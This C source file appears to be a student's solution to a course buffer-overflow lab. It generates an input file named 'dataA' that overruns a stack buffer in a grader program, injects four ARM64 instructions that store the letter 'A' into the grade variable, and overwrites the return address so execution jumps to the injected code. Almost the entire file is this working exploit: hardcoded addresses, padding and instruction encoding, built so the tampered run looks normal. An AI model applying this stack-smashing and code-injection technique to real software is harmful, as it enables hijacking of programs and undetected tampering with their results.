/*--------------------------------------------------------------------*/
/* createdataA.c                                                      */
/* author: anishkkat                                                  */
/*--------------------------------------------------------------------*/
/*
   this program produces a file named "dataA" that, when used as input to
   the grader program, coerces it into printing a grade of 'A' for the user
   "anishkkat". we accomplish this by overwriting stack memory via a
   buffer overrun, injecting instructions that load 'A' into the grade
   variable, and then branch to the printing code. through careful byte
   alignment and no unintended newlines, the output remains indistinguishable
   from a normal run.
*/

/*
   main function:
   - no command-line arguments are processed.
   - does not read from stdin or any stream.
   - writes a crafted sequence of bytes to "dataA" only.
   - returns 0 on success, 1 on failure (like file open error).
*/

#include <stdio.h>
#include <stdint.h>
#include "miniassembler.h"

/* constants for addresses and sizes (magic numbers) */
#define BUF_TOTAL   48       /* total buffer size in bytes */
#define GRADE_ADDR  0x420044 /* grade variable address */
#define PRINT_ADDR  0x40089c /* address to branch for printing grade */
#define RET_ADDR    0x420078 /* overwritten return address */
#define NAME_ADDR   0x420058 /* start of name array in bss */
#define NAME_LEN    9        /* length of "anishkkat" without '\0' */
#define CODE_BYTES  16       /* total instruction size: 4 instructions * 4 bytes */
#define PADDING_CT  22       /* number of padding bytes chosen from analysis */

/* for instructions, we represent 'A' as 0x41 instead of 'A' char */
#define CHAR_A      0x41

int main(void) {
    /* chosen name and file pointer */
    const char *p_name = "AnishKKat";
    FILE *fp_out = fopen("dataA", "w");
    if (!fp_out) return 1;

    /* instructions generated by miniassembler */
    unsigned int ui_instr_mov;
    unsigned int ui_instr_adr;
    unsigned int ui_instr_strb;
    unsigned int ui_instr_b;

    /* integer and addresses */
    int i_pad;
    unsigned long ul_ret_addr;

    /* write name (9 chars) plus a null terminator = 10 bytes total */
    fwrite(p_name, 1, NAME_LEN, fp_out);
    fputc('\0', fp_out);

    /* write PADDING_CT bytes of padding as '\0' to maintain stack alignment
       and position instructions correctly. using '\0' ensures no unwanted chars */
    for (i_pad = 0; i_pad < PADDING_CT; i_pad++) {
        fputc('\0', fp_out);
    }

    /* generate all instructions first before writing:
       1) mov w0, CHAR_A   (loads ASCII 'A' (0x41) into w0)
       2) adr x1, GRADE_ADDR at a known calculation point
       3) strb w0, [x1]    (stores 'A' into grade variable)
       4) b PRINT_ADDR     (branches to print-grade code)
       
       addresses are magic numbers, no logic changed */
    ui_instr_mov = MiniAssembler_mov(0, CHAR_A);
    ui_instr_adr = MiniAssembler_adr(1, GRADE_ADDR, 0x42007c);
    ui_instr_strb = MiniAssembler_strb(0, 1);
    ui_instr_b = MiniAssembler_b(PRINT_ADDR, 0x420084);

    /* now write the instructions in sequence */
    fwrite(&ui_instr_mov, sizeof(unsigned int), 1, fp_out);
    fwrite(&ui_instr_adr, sizeof(unsigned int), 1, fp_out);
    fwrite(&ui_instr_strb, sizeof(unsigned int), 1, fp_out);
    fwrite(&ui_instr_b, sizeof(unsigned int), 1, fp_out);

    /* now write the new return address that causes execution to jump into our code
       using RET_ADDR defined above. same logic, just renamed variable. */
    ul_ret_addr = RET_ADDR;
    fwrite(&ul_ret_addr, sizeof(unsigned long), 1, fp_out);

    /* close file */
    fclose(fp_out);
    return 0;
}